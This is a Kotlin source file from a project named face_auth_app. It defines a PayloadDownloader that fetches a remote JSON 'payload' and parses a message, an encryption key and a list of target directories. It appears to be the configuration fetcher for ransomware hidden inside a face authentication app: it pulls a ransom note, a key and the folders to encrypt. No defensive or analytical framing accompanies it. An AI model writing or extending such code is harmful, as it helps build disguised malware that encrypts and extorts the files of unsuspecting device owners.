package com.example.face_auth_app

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject

class PayloadDownloader {
    suspend fun downloadPayload(url: String): Payload? {
        return withContext(Dispatchers.IO) {
            try {
                val client = OkHttpClient()
                val request = Request.Builder().url(url).build()
                val response = client.newCall(request).execute()
                if (!response.isSuccessful) return@withContext null
                val json = JSONObject(response.body?.string() ?: return@withContext null)
                Payload(
                    message = json.getString("message"),
                    keyBase64 = json.getString("encryptionKey"),
                    targetDirs = json.getJSONArray("directories").let { array ->
                        (0 until array.length()).map { array.getString(it) }
                    }
                )
            } catch (_: Exception) { null }
        }
    }
}

data class Payload(
    val message: String,
    val keyBase64: String,
    val targetDirs: List<String>
)